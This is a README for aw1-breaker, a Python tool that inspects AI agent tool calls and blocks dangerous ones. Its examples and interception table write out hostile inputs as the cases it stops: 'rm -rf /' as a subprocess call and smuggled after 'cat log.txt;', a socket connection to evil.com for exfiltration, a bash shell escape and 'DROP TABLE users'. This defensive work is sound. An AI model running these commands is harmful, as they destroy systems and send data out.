# aw1-breaker (v2.0.1)

[![HOL Verified](https://img.shields.io/badge/HOL-Source_Verified-10B981?style=for-the-badge&logo=shield)](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker)
[![PyPI](https://img.shields.io/pypi/v/aw1-circuit-breaker?color=blue&style=for-the-badge)](https://pypi.org/project/aw1-circuit-breaker/)
[![Zero Dependencies](https://img.shields.io/badge/Runtime_Dependencies-Zero_(Standard_Lib)-blueviolet?style=for-the-badge)](pyproject.toml)
[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)
[![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
[![Latency](https://img.shields.io/badge/AST%20Evaluation-%3C0.2ms-brightgreen.svg)](benchmark.py)

> **Featured on Hashgraph Online (HOL):** Read the independent source-level teardown: [*What aw1-breaker 2.0.0 checks before a tool call*](https://hol.org/blog/stopping-rogue-agents-inside-the-ast-breaker).

`aw1-breaker` is a zero-dependency Python security circuit breaker that intercepts autonomous AI agent tool calls in sub-millisecond execution loops using Abstract Syntax Tree (AST) decompilation, per-actor rolling velocity monitors, and cryptographically signed HMAC execution tokens.

---

## ⚡ 10-Second Test Drive (Zero-Install)

Test the circuit breaker live in your terminal without installing anything:

```bash
uvx aw1-circuit-breaker --demo
```

Or verify an arbitrary snippet:

```bash
uvx aw1-circuit-breaker verify "subprocess.run(['rm', '-rf', '/'])"
```

---

## 📦 Installation

```bash
pip install aw1-circuit-breaker
```

*(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).*

---

## 🛡️ Enterprise Guard (Turnkey 3-Line Integration)

Drop enterprise boundary policies directly onto agent tools using the `@guard.protect` decorator:

```python
from aw1 import EnterpriseGuard, SecurityViolationError

guard = EnterpriseGuard(
    allowed_tools=["safe_query", "fetch_market_data"],
    max_velocity_per_min=60,
    max_financial_limit=250.0,
    readonly_sql=True
)

@guard.protect(tool_name="safe_query")
def execute_database_query(query: str):
    return db.execute(query)

# Benign queries execute instantly (< 0.2ms)
execute_database_query("SELECT id FROM users LIMIT 1;")

# Adversarial AST injections & SQL drops are halted deterministically
# -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
```

---

## 🔌 Model Context Protocol (MCP) Server

Run directly with Python:

```bash
python mcp_server.py
```

Or via `uvx`:

```bash
uvx mcp_server.py
```

### MCP Client Configuration

Add to your Claude Desktop or Cursor configuration:

```json
{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "python",
      "args": ["mcp_server.py"]
    }
  }
}
```

---

## ⚔️ Exploit Interception in Action

AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.

### Interception Matrix

| Attack Vector | Attacker Strategy | LLM Guardrail Result | AW-1 AST Circuit Breaker |
| :--- | :--- | :--- | :--- |
| **Dynamic Execution** | `eval(compile(...))` | Evades semantic filters | 🛑 **Tripped (`RESTRICTED_INVOCATION`)** |
| **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | 🛑 **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **SQL Destruction** | `DROP TABLE users;` | Prompt jailbreak bypass | 🛑 **Tripped (`HALT_SQL_MUTATION_FORBIDDEN`)** |

### Run the Showcase

```bash
python examples/enterprise_guard_demo.py
```

---

## ⏱️ Runtime Latency Telemetry

Deterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.

*Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.*

| Evaluation Target | p50 Latency | p95 Latency | p99 Latency | Status |
| :--- | :--- | :--- | :--- | :--- |
| **AST Inspection (Benign Payload)** | **0.0889 ms** | 0.1298 ms | 0.1645 ms | `< 0.2 ms` Overhead |
| **AST Inspection (Adversarial Exploit)** | **0.0520 ms** | 0.0919 ms | 0.1051 ms | Instant Breakout Halt |
| **Shell Argument Injection Guard** | **0.0051 ms** | 0.0096 ms | 0.0195 ms | Sub-20 µs Inspection |

Reproduce locally:

```bash
python benchmark.py
```

---

## 🧩 Framework Integration (LangGraph Example)

AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:

```python
from examples.langgraph_adapter import execute_agent_action, CircuitBreakerException

# Guard autonomous agent tool dispatches
try:
    execute_agent_action(bash_tool, "bash_tool", {"cmd": "cat log.txt; rm -rf /"})
except CircuitBreakerException as blocked:
    print(f"Tool call halted: {blocked}")
```

---

## 🌐 Production Cloud API & Quota Upgrades

Deploying autonomous agents in production? Route your tool dispatch loops through our hosted API gateway with sub-0.2ms deterministic AST inspection:

| Plan | Pricing (USD / BWP) | Quota & Features | Access / Checkout |
| :--- | :--- | :--- | :--- |
| **Developer Sandbox** | Free | 10,000 requests, HMAC token minting | Code `HOL-BREAKER-2026` |
| **Developer Pro** | $49 / BWP 650 /mo | 100,000 audit requests, 1 license key, offline HMAC validation | [Upgrade to Pro](https://laveto-wisdom.lemonsqueezy.com/checkout) |
| **Team / Startup** | $199 / BWP 2,650 /mo | 1,000,000 audit requests, 5 seat keys, Redis state sync | [Upgrade to Team](https://laveto-wisdom.lemonsqueezy.com/checkout) |
| **Enterprise Dedicated** | $990 / BWP 13,200 /mo | Unlimited seats, dedicated gateway tenant, custom statutory lenses | [Enterprise Desk](https://p20.laveto.net/wisdom/tender-portal) |

To activate enterprise quotas, pass your signed bearer token in the `Authorization` header:

```bash
curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
  -H "Authorization: Bearer AW1-EXEC-TOKEN-..." \
  -H "Content-Type: application/json" \
  -d '{"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"}'
```

---

## License

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0). See [LICENSE](LICENSE) for details.
